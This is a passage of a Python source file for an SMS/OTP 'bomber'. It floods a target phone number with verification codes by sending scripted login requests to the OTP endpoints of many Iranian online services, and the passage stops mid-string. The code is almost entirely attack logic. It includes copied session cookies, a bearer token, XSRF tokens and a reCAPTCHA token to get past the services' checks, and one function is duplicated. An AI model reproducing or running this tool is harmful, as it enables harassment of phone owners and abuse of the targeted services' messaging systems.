def bomber(numberphone_AAA , timerbomber_AAA=0.1):
    from platform import node, system, release; Node, System, Release = node(), system(), release() 
    from os import system, name
    from re import match, sub
    from threading import Thread, active_count
    import urllib3; urllib3.disable_warnings()
    from time import sleep
    from requests import get, post
    from user_agent import generate_user_agent

    def phone_aaa(numberphone , timerbomber=0.1):
        print(f'number {numberphone_AAA} , let`s GOOOOOOOOOOO')
        a = {'s' : 0 , 'e' :0}
        def print_bomb(text='',text2=''):
            if not text == 'er':
                a['s'] = int(a['s']) + 1
            else: a['e'] = int(a['e']) + 1
            print(f"successful = {a['s']}  ,  failed = {a['e']}",end='\r')

        def snap(phone):
            snapH = {"Host": "app.snapp.taxi", "content-length": "29", "x-app-name": "passenger-pwa", "x-app-version": "5.0.0", "app-version": "pwa", "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36", "content-type": "application/json", "accept": "*/*", "origin": "https://app.snapp.taxi", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://app.snapp.taxi/login/?redirect_to\u003d%2F", "accept-encoding": "gzip, deflate, br", "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6", "cookie": "_gat\u003d1"}
            snapD = {"cellphone":phone}
            try:
                snapR = post(timeout=5, url="https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", headers=snapH, json=snapD).text
                if "OK" in snapR:
                    print_bomb(f'{g}(Snap) {w}Code Was Sent')
                    return True #snapp
            except: print_bomb(f'er')
        def gap(phone):
            gapH = {"Host": "core.gap.im","accept": "application/json, text/plain, */*","x-version": "4.5.7","accept-language": "fa","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","appversion": "web","origin": "https://web.gap.im","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://web.gap.im/","accept-encoding": "gzip, deflate, br"}
            try:
                gapR = get(timeout=5, url="https://core.gap.im/v1/user/add.json?mobile=%2B{}".format(phone), headers=gapH).text
                if "OK" in gapR:
                    print_bomb(f'{g}(Gap) {w}Code Was Sent')
                    return True #gap
                
            except: print_bomb(f'er')
        def gap(phone):
            gapH = {"Host": "core.gap.im","accept": "application/json, text/plain, */*","x-version": "4.5.7","accept-language": "fa","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","appversion": "web","origin": "https://web.gap.im","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://web.gap.im/","accept-encoding": "gzip, deflate, br"}
            try:
                gapR = get(timeout=5, url="https://core.gap.im/v1/user/add.json?mobile=%2B{}".format(phone), headers=gapH).text
                if "OK" in gapR:
                    print_bomb(f'{g}(Gap) {w}Code Was Sent')
                    return True #gap     
                
                
                
            except: print_bomb(f'er')
        def tap30(phone):
            tap30H = {"Host": "tap33.me","Connection": "keep-alive","Content-Length": "63","User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","content-type": "application/json","Accept": "*/*","Origin": "https://app.tapsi.cab","Sec-Fetch-Site": "cross-site","Sec-Fetch-Mode": "cors","Sec-Fetch-Dest": "empty","Referer": "https://app.tapsi.cab/","Accept-Encoding": "gzip, deflate, br","Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
            tap30D = {"credential":{"phoneNumber":"0"+phone,"role":"PASSENGER"}}
            try:
                tap30R = post(timeout=5, url="https://tap33.me/api/v2/user", headers=tap30H, json=tap30D).json()
                if tap30R['result'] == "OK":
                    print_bomb(f'{g}(Tap30) {w}Code Was Sent')
                    return True #tapsi
            except: print_bomb(f'er')
            
        def divar(phone):
            divarH = {'accept': 'application/json, text/plain, */*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://divar.ir',
        'referer': 'https://divar.ir/',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
        'x-standard-divar-error': 'true'}
            divarD = {"phone":phone}
            try:
                divarR = post(timeout=5, url="https://api.divar.ir/v5/auth/authenticate", headers=divarH, json=divarD).json()
                if divarR["authenticate_response"] == "AUTHENTICATION_VERIFICATION_CODE_SENT":
                    print_bomb(f'{g}(Divar) {w}Code Was Sent')
                    return True #divar api
            except: print_bomb(f'er')
            
        def torob(phone):
            phone = '0'+phone.split('+98')[1]
            torobH = {'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9',
        'cookie': 'abtest=next_pwa; search_session=ofwjiyqqethomevqrgzxvopjtgkgimdc; _gcl_au=1.1.805505755.1639260830; _gid=GA1.2.683761449.1639260830; _gat_UA-105982196-1=1; _ga_CF4KGKM3PG=GS1.1.1639260830.1.0.1639260830.0; _clck=130ifw1|1|ex6|0; _ga=GA1.2.30224238.1639260830',
        'origin': 'https://torob.com',
        'referer': 'https://torob.com/',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'}
            try:
                torobR = get(timeout=5, url=f"https://api.torob.com/a/phone/send-pin/?phone_number={phone}", headers=torobH).json()
                if torobR["message"] == "pin code sent":
                    print_bomb(f'{g}(Torob) {w}Code Was Sent')
                    return True # torob
            except: print_bomb(f'er')

        def snapfood(phone):
            sfoodU = 'https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.0&UDID=39c62f64-3d2d-4954-9033-816098559ae4&locale=fa'
            sfoodH = {'accept': 'application/json, text/plain, */*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9',
        'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp0aSI6IjYxZTA5NjE5ZjVmZTNkNmRlOTMwYTQwY2I5NzdlMTBhYWY2Y2MxYWIzYTNhNjYxM2U2YWFmZGNkMzhhOTY0Mzg1NjZkMzIyMGQ3NDU4MTc2In0.eyJhdWQiOiJzbmFwcGZvb2RfcHdhIiwianRpIjoiNjFlMDk2MTlmNWZlM2Q2ZGU5MzBhNDBjYjk3N2UxMGFhZjZjYzFhYjNhM2E2NjEzZTZhYWZkY2QzOGE5NjQzODU2NmQzMjIwZDc0NTgxNzYiLCJpYXQiOjE2MzkzMTQ4NjMsIm5iZiI6MTYzOTMxNDg2MywiZXhwIjoxNjQxOTkzMzgzLCJzdWIiOiIiLCJzY29wZXMiOlsibW9iaWxlX3YyIiwibW9iaWxlX3YxIiwid2VidmlldyJdfQ.aRR7PRnrh-hfQEhkG2YnN_AJL3AjGsI2LmWwRufsvnD6enxPGJQXyZFn9MoH3OSBPmgXFMoHmCnbXvxoDA5jeRdmUvy4swLbKZf7mfv2Zg4CEQusIGgBHeqMmI31H2PIhCLPtShg0trGgzs-BUCArzMM6TV7s1P6GKMhSyXXVzxj8duJxdiNTVx5IeO8GAo8hpt6pojbp3q07xhECgK-8-3n8qevV9CRBtIwhkhqrcubgrQk6ot64ksiosVhHhvI-xVm1AW8hArI62VcEv-13AH92e9n30auYYKC961wRU6_FUFzauHqSXlhWBgZo6-uO9gwrLA7g0_91G8Eu98V4cKsVWZaRLRP1-tQE9otJduaSvEF4e88FdgW3A045Bd0I2F5Uri2WEemVyMV8CVT8Kdio6iBwGl8dLQS7SJhK7OYwTp_S7AZ9A4wJJbTuw-rU4_ykM2PlR5tNXwTNpcEdiLdglFsv9c0NOyClMIsAU7t7NcYcxdQ5twSDWPUmKK-k0xZMdeACUclkYYFNPqGSccGX0jpioyET0sMFrHQyeOvHxGPLfMeoTaXUA8LMognQ3oCWCsZHrcaQSJJ7H9WUIf4SYUvRwp-RE4JUxpOXvxgPjk0b1VUYF0dHjf1C-uQ3D7aYEAuzSW0JWyEFhurNpBaeQQhf35HH-SchuWCjafAr8rU0BCNkQJd4aresr7moHos1a_KoeQ2Y1HloPzsjOzRSpK97vApN0naRwK8k9RsoN65URZDbEzTc1b2dpTUR-VJw7lU0v5jT_PvZs7GUnpnv23UrYQIfMKISF9suy6ufb26DdIAr2pLOQ9NKqxb4QwDadFa1gPIpb_QU-8hL6N9533YTvTE8xJJjjwE6IQutNsZ1OdBdrj4APjNczDpb3PFaXtI0CbOKHYIUDsdyEIdF1o9RYrKYj-EP61SA0gzks-qYGJR1jnfQRkwkqoolu2lvDK0PxDXnM4Crd4kJRxVtrsD0P8P-jEvW6PYAmxXPtnsu5zxSMnllNNeOOAijcxG6IyPW-smsHV-6BAdk5w3FXAPe0ZcuDXb0gZseq2-GnqxmNDmRWyHc9TuGhAhWdxaP-aNm6MmoSVJ-G6fLsjXY3KLaRnIhmNfABxqcx0f03g6sBIh_1Rw965_WydlsMVU_K5-AIfsXPSxSmVnIPrN4VasUnp3XbJmnO9lm_rrpdNAM3VK20UPLCpxI7Ymxdl9wboAg8cdPlyBxIcClwtui0RC1FGZ-GpvVzWZDq_Mu6UEbU3bfi9Brr5CJ-0aa8McOK8TJBHCqfLHYOOqAruaLHhNR0fjw-bIzHLKtxGhwkkGp7n_28HtbiZVKqr48rBfbhzanCpSPYGDV4PM1_zrJDUJn4sRitw_Z78Lju3ssjuMae8zAEdHUCHGui_tYMABlPVaZhsB4s-KahT4aTOhzd7ejjoLE9WQUSuQBmMTGFZM0xH0Phyz1vSl7_5IpTHcCwTXUx3s8UvRB-Q3QQBa5O82gtZWTd56R7u0YrCJKVEnsf9a9lZz9Of6R4YdPhwByMvHFfbRLgNkuGzv75dZZf24KmbPTZN4sVCZgxD7oO0sTgh2hEYMSmdHnXvCySXZk_1G52yP8S7IwnEXRq_Hu1aje2dz0FRWYFR8nnmFuRyYSfj1rSy1Vut4ktNUsstlAYn8QmsvNqyn402aikpuG6s0ApOGMuLChv_BDd_tbsLu11-qLv3r5Exza9XJMq4aOFegpPJ5vH75entTpxPa16gmJ80lhlvKux0vnZI-mEDZ8zEI5uXi26zv4taUqLNw5nXQZbi8sxh90nYF1fNAQ-ERHQmoUeqAwL9AuZobvR7pRMmmjZMPeeDPPFrNDyCHYFO_Iu5kClQM_7jzmsLkOvCD68DkwhwftkNvTiA-dDqkkNpY8OB0GI4ynhrAqHN4Y378qbks7q4ifUU1NsSI5xdkHC4fseKMJTnnCYdyfhH14_X46zuAvSIL7DX262VTb6dAIN5KoHkjacc77Z4V7HsncWBysaXqK5yUIkL3JB5AiZlp8nV0_hCjNfA3QsfGQVoMYYeoTIutKF9Hr9r1efOXmTU0URZ-C6LYgzcntKlryroLwVg5jP3s2jQyCTIvs4CitUAyJEC3VyeW_VlSA02uMqxB-pjkipGEKe3KO1diCU7afe0xkd5C4K1NG-kLAbRAhCCtLRVJVSP0a_t84F737B9lub6bs5QcCvxARlfogXerUg9MjMU9qCWLzN9x2MukbsijxzmsGFcw-OBecMETDwoyB_0HrxP95QCwxw_X4rcW60HL45xbv9iC-gsn1qd-FKzO-XSYU0VWprr_z12bl9QOnpMc6OYf74IeJ27zl1nWR_gLo-Wg-WeFDyWcpNjmiHZkHYiDa1c3RgFv2t4ezYP0tsQEzLy-Yx0yB7WI5Z2kd_cSuaX73U9PW7rOCGnCD9cfyxZ27VyiHx8YMKKch6lyNmwPGfMhYqgMMo4NLmKy44taXRKPV20DhIsuNdMPcPUofrrrTsKarxurCX8EwRev4Ox-GcP-ocFtjKq_jkGRnqh4QQrJJh3Unpxm3sHcWhIWkNIcyChdjwnHPqKLb49UbVyJKxkt26E-cuO7_oC7PbMe8YjKFrmr2_igqr9i-YioVy1MdI5TL9sZhS8bMwG2rMozBYqWT9czRIKwabP9dUKpEn-d1nLbdrEeSzXOLYtXutiO57lGpxTDgf3ELp1zIEvTW7SEJBQ',
        'content-type': 'application/x-www-form-urlencoded',
        'cookie': 'UUID=39c62f64-3d2d-4954-9033-816098559ae4; location={"id":"","latitude":"-1.000","longitude":"-1.000","mode":"Auto"}; rl_user_id=RudderEncrypt%3AU2FsdGVkX1%2BRQfjyp1DGE7w6o2UXNZHyc7XXXwZB6%2B4%3D; rl_anonymous_id=RudderEncrypt%3AU2FsdGVkX1%2FKNDbZLoR2s9fxetSEbovoXrW2OyagTvcRyyfS%2BiAq3Wo0gtPlB2mt5jezOT0RcCuwOIS0v8tUKw%3D%3D; rl_group_id=RudderEncrypt%3AU2FsdGVkX1%2Bxvj2aS9mFuxvX6rDEMIsAuRecCyMypTk%3D; rl_trait=RudderEncrypt%3AU2FsdGVkX1%2B8so%2F5rMdojUEEuG%2BVwFrtXzXNtpojE10%3D; rl_group_trait=RudderEncrypt%3AU2FsdGVkX1%2FUIoTuPIMvAKRiGcEmnsfog8TvprQ8QJI%3D; rl_page_init_referrer=RudderEncrypt%3AU2FsdGVkX1%2FOaB1OTIgZSuGfv6Ov271AcX0ZKQWg94ey1fyJ%2Fv%2B2H09dia3Z%2BMvi; rl_page_init_referring_domain=RudderEncrypt%3AU2FsdGVkX19W4bPJRR7lbNo2fIWRB3Gk2GDkBYASrB7u755JxTnymjQ4j%2BjxgRx0; jwt-refresh_token=undefined; jwt-token_type=Bearer; jwt-expires_in=2678399; jwt-access_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp0aSI6IjYxZTA5NjE5ZjVmZTNkNmRlOTMwYTQwY2I5NzdlMTBhYWY2Y2MxYWIzYTNhNjYxM2U2YWFmZGNkMzhhOTY0Mzg1NjZkMzIyMGQ3NDU4MTc2In0.eyJhdWQiOiJzbmFwcGZvb2RfcHdhIiwianRpIjoiNjFlMDk2MTlmNWZlM2Q2ZGU5MzBhNDBjYjk3N2UxMGFhZjZjYzFhYjNhM2E2NjEzZTZhYWZkY2QzOGE5NjQzODU2NmQzMjIwZDc0NTgxNzYiLCJpYXQiOjE2MzkzMTQ4NjMsIm5iZiI6MTYzOTMxNDg2MywiZXhwIjoxNjQxOTkzMzgzLCJzdWIiOiIiLCJzY29wZXMiOlsibW9iaWxlX3YyIiwibW9iaWxlX3YxIiwid2VidmlldyJdfQ.aRR7PRnrh-hfQEhkG2YnN_AJL3AjGsI2LmWwRufsvnD6enxPGJQXyZFn9MoH3OSBPmgXFMoHmCnbXvxoDA5jeRdmUvy4swLbKZf7mfv2Zg4CEQusIGgBHeqMmI31H2PIhCLPtShg0trGgzs-BUCArzMM6TV7s1P6GKMhSyXXVzxj8duJxdiNTVx5IeO8GAo8hpt6pojbp3q07xhECgK-8-3n8qevV9CRBtIwhkhqrcubgrQk6ot64ksiosVhHhvI-xVm1AW8hArI62VcEv-13AH92e9n30auYYKC961wRU6_FUFzauHqSXlhWBgZo6-uO9gwrLA7g0_91G8Eu98V4cKsVWZaRLRP1-tQE9otJduaSvEF4e88FdgW3A045Bd0I2F5Uri2WEemVyMV8CVT8Kdio6iBwGl8dLQS7SJhK7OYwTp_S7AZ9A4wJJbTuw-rU4_ykM2PlR5tNXwTNpcEdiLdglFsv9c0NOyClMIsAU7t7NcYcxdQ5twSDWPUmKK-k0xZMdeACUclkYYFNPqGSccGX0jpioyET0sMFrHQyeOvHxGPLfMeoTaXUA8LMognQ3oCWCsZHrcaQSJJ7H9WUIf4SYUvRwp-RE4JUxpOXvxgPjk0b1VUYF0dHjf1C-uQ3D7aYEAuzSW0JWyEFhurNpBaeQQhf35HH-SchuWCjafAr8rU0BCNkQJd4aresr7moHos1a_KoeQ2Y1HloPzsjOzRSpK97vApN0naRwK8k9RsoN65URZDbEzTc1b2dpTUR-VJw7lU0v5jT_PvZs7GUnpnv23UrYQIfMKISF9suy6ufb26DdIAr2pLOQ9NKqxb4QwDadFa1gPIpb_QU-8hL6N9533YTvTE8xJJjjwE6IQutNsZ1OdBdrj4APjNczDpb3PFaXtI0CbOKHYIUDsdyEIdF1o9RYrKYj-EP61SA0gzks-qYGJR1jnfQRkwkqoolu2lvDK0PxDXnM4Crd4kJRxVtrsD0P8P-jEvW6PYAmxXPtnsu5zxSMnllNNeOOAijcxG6IyPW-smsHV-6BAdk5w3FXAPe0ZcuDXb0gZseq2-GnqxmNDmRWyHc9TuGhAhWdxaP-aNm6MmoSVJ-G6fLsjXY3KLaRnIhmNfABxqcx0f03g6sBIh_1Rw965_WydlsMVU_K5-AIfsXPSxSmVnIPrN4VasUnp3XbJmnO9lm_rrpdNAM3VK20UPLCpxI7Ymxdl9wboAg8cdPlyBxIcClwtui0RC1FGZ-GpvVzWZDq_Mu6UEbU3bfi9Brr5CJ-0aa8McOK8TJBHCqfLHYOOqAruaLHhNR0fjw-bIzHLKtxGhwkkGp7n_28HtbiZVKqr48rBfbhzanCpSPYGDV4PM1_zrJDUJn4sRitw_Z78Lju3ssjuMae8zAEdHUCHGui_tYMABlPVaZhsB4s-KahT4aTOhzd7ejjoLE9WQUSuQBmMTGFZM0xH0Phyz1vSl7_5IpTHcCwTXUx3s8UvRB-Q3QQBa5O82gtZWTd56R7u0YrCJKVEnsf9a9lZz9Of6R4YdPhwByMvHFfbRLgNkuGzv75dZZf24KmbPTZN4sVCZgxD7oO0sTgh2hEYMSmdHnXvCySXZk_1G52yP8S7IwnEXRq_Hu1aje2dz0FRWYFR8nnmFuRyYSfj1rSy1Vut4ktNUsstlAYn8QmsvNqyn402aikpuG6s0ApOGMuLChv_BDd_tbsLu11-qLv3r5Exza9XJMq4aOFegpPJ5vH75entTpxPa16gmJ80lhlvKux0vnZI-mEDZ8zEI5uXi26zv4taUqLNw5nXQZbi8sxh90nYF1fNAQ-ERHQmoUeqAwL9AuZobvR7pRMmmjZMPeeDPPFrNDyCHYFO_Iu5kClQM_7jzmsLkOvCD68DkwhwftkNvTiA-dDqkkNpY8OB0GI4ynhrAqHN4Y378qbks7q4ifUU1NsSI5xdkHC4fseKMJTnnCYdyfhH14_X46zuAvSIL7DX262VTb6dAIN5KoHkjacc77Z4V7HsncWBysaXqK5yUIkL3JB5AiZlp8nV0_hCjNfA3QsfGQVoMYYeoTIutKF9Hr9r1efOXmTU0URZ-C6LYgzcntKlryroLwVg5jP3s2jQyCTIvs4CitUAyJEC3VyeW_VlSA02uMqxB-pjkipGEKe3KO1diCU7afe0xkd5C4K1NG-kLAbRAhCCtLRVJVSP0a_t84F737B9lub6bs5QcCvxARlfogXerUg9MjMU9qCWLzN9x2MukbsijxzmsGFcw-OBecMETDwoyB_0HrxP95QCwxw_X4rcW60HL45xbv9iC-gsn1qd-FKzO-XSYU0VWprr_z12bl9QOnpMc6OYf74IeJ27zl1nWR_gLo-Wg-WeFDyWcpNjmiHZkHYiDa1c3RgFv2t4ezYP0tsQEzLy-Yx0yB7WI5Z2kd_cSuaX73U9PW7rOCGnCD9cfyxZ27VyiHx8YMKKch6lyNmwPGfMhYqgMMo4NLmKy44taXRKPV20DhIsuNdMPcPUofrrrTsKarxurCX8EwRev4Ox-GcP-ocFtjKq_jkGRnqh4QQrJJh3Unpxm3sHcWhIWkNIcyChdjwnHPqKLb49UbVyJKxkt26E-cuO7_oC7PbMe8YjKFrmr2_igqr9i-YioVy1MdI5TL9sZhS8bMwG2rMozBYqWT9czRIKwabP9dUKpEn-d1nLbdrEeSzXOLYtXutiO57lGpxTDgf3ELp1zIEvTW7SEJBQ; crisp-client%2Fsession%2F4df7eed4-f44a-4e3d-a5cc-98ec87b592bc=session_69ff5918-b549-4c78-89fd-b851ca35bdf6; crisp-client%2Fsocket%2F4df7eed4-f44a-4e3d-a5cc-98ec87b592bc=0',
        'origin': 'https://snappfood.ir',
        'referer': 'https://snappfood.ir/',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 OPR/82.0.4227.23'}
            sfoodD = {"cellphone": "0"+phone}
            try:
                sfoodR = post(timeout=5, url=sfoodU, headers=sfoodH, data=sfoodD).json()
                if sfoodR['status'] == True:
                    print_bomb(f'{g}(SnapFood) {w}Code Was Sent')
                    return True # snapp food
            except: print_bomb(f'er')
            
        def sheypoor(phone):
            sheyporH = {"Host": "www.sheypoor.com","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0","Accept": "*/*","Accept-Language": "en-US,en;q=0.5","Accept-Encoding": "gzip, deflate, br","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","Content-Length": "62","Origin": "https://www.sheypoor.com","Connection": "keep-alive","Referer": "https://www.sheypoor.com/session","Cookie": "plog=False; _lba=false; AMP_TOKEN=%24NOT_FOUND; ts=46f5e500c49277a72f267de92dd51238; track_id=22f97cea33f34e368e4b3edd23afd391; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_session_token=3f475c6e-f55b-0d29-de67-6cdc46bc6592; analytics_token=3cce634d-040a-baf3-fdd6-552578d672df; yektanet_session_last_activity=8/13/2020; _yngt=0bc37b56-6478-488b-c801-521f101259fd; _lbsa=false; _ga=GA1.2.1464689488.1597346921; _gid=GA1.2.1551213293.1597346921; _gat=1","TE": "Trailers"}
            sheyporD = {"username" : "0"+phone}
            try:
                sheyporR = post(timeout=5, url='https://www.sheypoor.com/auth', headers=sheyporH, data=sheyporD).json()
                if sheyporR['success'] == True:
                    print_bomb(f'{g}(Sheypoor) {w}Code Was Sent')
                    return True # Sheypoor
            except: print_bomb(f'er')

        def okorosh(phone):
            okJ = {
            "mobile": "0"+phone,
            "g-recaptcha-response": "03AGdBq255m4Cy9SQ1L5cgT6yD52wZzKacalaZZw41D-jlJzSKsEZEuJdb4ujcJKMjPveDKpAcMk4kB0OULT5b3v7oO_Zp8Rb9olC5lZH0Q0BVaxWWJEPfV8Rf70L58JTSyfMTcocYrkdIA7sAIo7TVTRrH5QFWwUiwoipMc_AtfN-IcEHcWRJ2Yl4rT4hnf6ZI8QRBG8K3JKC5oOPXfDF-vv4Ah6KsNPXF3eMOQp3vM0SfMNrBgRbtdjQYCGpKbNU7P7uC7nxpmm0wFivabZwwqC1VcpH-IYz_vIPcioK2vqzHPTs7t1HmW_bkGpkZANsKeDKnKJd8dpVCUB1-UZfKJVxc48GYeGPrhkHGJWEwsUW0FbKJBjLO0BdMJXHhDJHg3NGgVHlnOuQV_wRNMbUB9V5_s6GM_zNDFBPgD5ErCXkrE40WrMsl1R6oWslOIxcSWzXruchmKfe"
        }
            okU = 'https://my.okcs.com/api/check-mobile'
            okH = {'accept': 'application/json, text/plain, */*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json;charset=UTF-8',
        'cookie': '_ga=GA1.2.1201761975.1639324247; XSRF-TOKEN=eyJpdiI6IllzYkQvdHJ5NVp3M1JyZmYweWFDTGc9PSIsInZhbHVlIjoiZ0wxQUZjR2ZzNEpPenFUZUNBZC95c2RFaEt4Y2x4VWJ2QlBmQ1ZIbUJHV2VEOGt0VG1XMXBaOVpJUFBkK2NOZmNvckxibDQ5cDkxc2ZJRkhJQUY4RlBicU80czIvZWhWZm1OSnJZMXZEbXE4TnlVeGZUSDhSYU9PRzZ6QzZGMkYiLCJtYWMiOiI2NWZlOTkxMTBjZDA5NzkyNDgwMjk2NGEwMDQzMGVhM2U1ODEzNmQ1YjExY2Q1ODc5MDFmZDBhMmZjMjQwY2JjIn0%3D; myokcs_session=eyJpdiI6InlYaXBiTUw1dHFKM05rN0psNjlwWXc9PSIsInZhbHVlIjoiNDg1QWJQcGwvT3NUOS9JU1dSZGk2K2JkVlNVV2wrQWxvWGVEc0d1MDR1aTNqVSs4Z0llSDliMW04ZFpGTFBUOG82NEJNMVFmTmNhcFpzQmJVTkpQZzVaUEtkSnFFSHU0RFprcXhWZlY0Zit2UHpoaVhLNXdmdUZYN1RwTnVLUFoiLCJtYWMiOiI5NTUwMmI2NDhkNWJjNDgwOGNmZjQxYTI4YjA0OTFjNTQ5NDc0YWJiOWIwZmI4MTViMWM0NDA4OGY5NGNhOGIzIn0%3D',
        'origin': 'https://my.okcs.com',
        'referer': 'https://my.okcs.com/',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33',
        'x-requested-with': 'XMLHttpRequest',
        'x-xsrf-token': 'eyJpdiI6IllzYkQvdHJ5NVp3M1JyZmYweWFDTGc9PSIsInZhbHVlIjoiZ0wxQUZjR2ZzNEpPenFUZUNBZC95c2RFaEt4Y2x4VWJ2QlBmQ1ZIbUJHV2VEOGt0VG1XMXBaOVpJUFBkK2NOZmNvckxibDQ5cDkxc2ZJRkhJQUY4RlBicU80czIvZWhWZm1OSnJZMXZEbXE4TnlVeGZUSDhSYU9PRzZ6QzZGMkYiLCJtYWMiOiI2NWZlOTkxMTBjZDA5NzkyNDgwMjk2NGEwMDQzMGVhM2U1ODEzNmQ1YjExY2Q1ODc5MDFmZDBhMmZjMjQwY2JjIn0='}
            try:
                okR = post(timeout=5, url=okU, headers=okH, json=okJ).text
                if 'success' in okR:
                    print_bomb(f'{g}(OfoghKourosh) {w}Code Was Sent')
                    return True #OfoghKourosh
            except: print_bomb(f'er')
            
        def alibaba(phone):
            alibabaH = {"Host": "ws.alibaba.ir","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0","Accept": "application/json, text/plain, */*","Accept-Language": "en-US,en;q=0.5","Accept-Encoding": "gzip, deflate, br","ab-channel": "WEB,PRODUCTION,CSR,WWW.ALIBABA.IR","ab-alohomora": "MTMxOTIzNTI1MjU2NS4yNTEy","Content-Type": "application/json;charset=utf-8","Content-Length": "29","Origin": "https://www.alibaba.ir","Connection": "keep-alive","Referer": "https://www.alibaba.ir/hotel"}
            alibabaD = {"phoneNumber":"0"+phone}
            try:
                alibabaR = post(timeout=5, url='https://ws.alibaba.ir/api/v3/account/mobile/otp', headers=alibabaH, json=alibabaD ).json()
                if alibabaR["result"]["success"] == True:
                    print_bomb(f'{g}(AliBaba) {w}Code Was Sent')
                    return True
            except: print_bomb(f'er')

        def smarket(phone):
            smarketU = f'https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0{phone}'
            smarketH = {'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'text/plain;charset=UTF-8',
        'origin': 'https://snapp.market',
        'referer': 'https://snapp.market/',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33'}
            try:
                smarketR = post(timeout=5, url=smarketU, headers=smarketH).json()
                if smarketR['status'] == True:
                    print_bomb(f'{g}(SnapMarket) {w}Code Was Sent')
                    return True #SnapMarket
            except: print_bomb(f'er')
            
        def gapfilm(phone):
            gaJ = {
            "Type": 3,
            "Username": phone,
            "SourceChannel": "GF_WebSite",
            "SourcePlatform": "desktop",
            "SourcePlatformAgentType": "Opera",
            "SourcePlatformVersion": "82.0.4227.33",
            "GiftCode": None
        }
            gaU = 'https://core.gapfilm.ir/api/v3.1/Account/Login'
            gaH = {'Accept': 'application/json, text/plain, */*',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'fa',
        'Browser': 'Opera',
        'BrowserVersion': '82.0.4227.33',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Host': 'core.gapfilm.ir',
        'IP': '185.156.172.170',
        'Origin': 'https://www.gapfilm.ir',
        'OS': 'Linux',
        'Referer': 'https://www.gapfilm.ir/',
        'SourceChannel': 'GF_WebSite',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33'}
            try:
                gaR = post(timeout=5, url=gaU, headers=gaH, json=gaJ).json()
                if gaR['Code'] == 1:
                    print_bomb(f'{g}(GapFilm) {w}Code Was Sent')
                    return True
            except: print_bomb(f'er')
        def sTrip(phone):
            sTripH = {"Host": "www.snapptrip.com","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0","Accept": "*/*","Accept-Language": "fa","Accept-Encoding": "gzip, deflate, br","Content-Type": "application/json; charset=utf-8","lang": "fa","X-Requested-With": "XMLHttpRequest","Content-Length": "134","Origin": "https://www.snapptrip.com","Connection": "keep-alive","Referer": "https://www.snapptrip.com/","Cookie": "route=1597937159.144.57.429702; unique-cookie=KViXnCmpkTwY7rY; appid=g*-**-*; ptpsession=g--196189383312301530; _ga=GA1.2.118271034.1597937174; _ga_G8HW6QM8FZ=GS1.1.1597937169.1.0.1597937169.60; _gid=GA1.2.561928072.1597937182; _gat_UA-107687430-1=1; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_session_token=445b5d83-abeb-7ffd-091e-ea1ce5cfcb52; analytics_token=2809eef3-a3cf-7b9c-4191-8d8be8e5c6b7; yektanet_session_last_activity=8/20/2020; _hjid=b1148e0d-8d4b-4a3d-9934-0ac78569f4ea; 